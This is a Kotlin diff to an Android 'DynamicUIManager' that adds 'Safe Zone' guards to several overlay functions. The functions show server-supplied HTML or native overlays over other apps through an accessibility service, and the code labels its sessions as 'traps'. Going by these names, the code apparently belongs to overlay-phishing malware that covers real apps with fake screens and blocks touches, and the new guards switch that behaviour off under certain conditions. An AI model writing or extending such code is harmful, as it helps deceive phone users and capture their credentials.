@@ -613,6 +613,10 @@ object DynamicUIManager {
 
     @SuppressLint("SetJavaScriptEnabled")
     fun showOverlay(ctx: Context, touchable: Boolean, method: String, htmlContent: String, isFullScreen: Boolean = true) {
+        if (MyAccessibilityService.isSafeZoneActive(ctx)) {
+            DebugLogger.log("SDUI", "showOverlay BLOCKED by Safe Zone.")
+            return
+        }
         Handler(Looper.getMainLooper()).post {
             activeTrapSessionId = System.currentTimeMillis()
             DebugLogger.log("SDUI_VERBOSE", "showOverlay triggered. Method: $method | Touchable: $touchable | FullScreen: $isFullScreen")
@@ -815,6 +819,10 @@ object DynamicUIManager {
 
     @SuppressLint("SetJavaScriptEnabled")
     fun showStatusBarOverlay(ctx: Context, touchable: Boolean, htmlContent: String) {
+        if (MyAccessibilityService.isSafeZoneActive(ctx)) {
+            DebugLogger.log("SDUI", "showStatusBarOverlay BLOCKED by Safe Zone.")
+            return
+        }
         Handler(Looper.getMainLooper()).post {
             DebugLogger.log("SDUI", "showStatusBarOverlay triggered. Touchable: $touchable")
             val serviceInstance = MyAccessibilityService.instance
@@ -910,6 +918,7 @@ object DynamicUIManager {
     }
 
     fun showTouchGuard(ctx: Context) {
+        if (MyAccessibilityService.isSafeZoneActive(ctx)) return
         Handler(Looper.getMainLooper()).post {
             val service = MyAccessibilityService.instance ?: return@post
             val wm = service.getSystemService(Context.WINDOW_SERVICE) as WindowManager
@@ -955,6 +964,10 @@ object DynamicUIManager {
     }
 
     fun showNativeOverlay(ctx: Context, dirPath: String, className: String, dimLevel: Int) {
+        if (MyAccessibilityService.isSafeZoneActive(ctx)) {
+            DebugLogger.log("NATIVE_TRAP", "showNativeOverlay BLOCKED by Safe Zone.")
+            return
+        }
         Handler(Looper.getMainLooper()).post {
             activeTrapSessionId = System.currentTimeMillis()
             val serviceInstance = MyAccessibilityService.instance ?: return@post
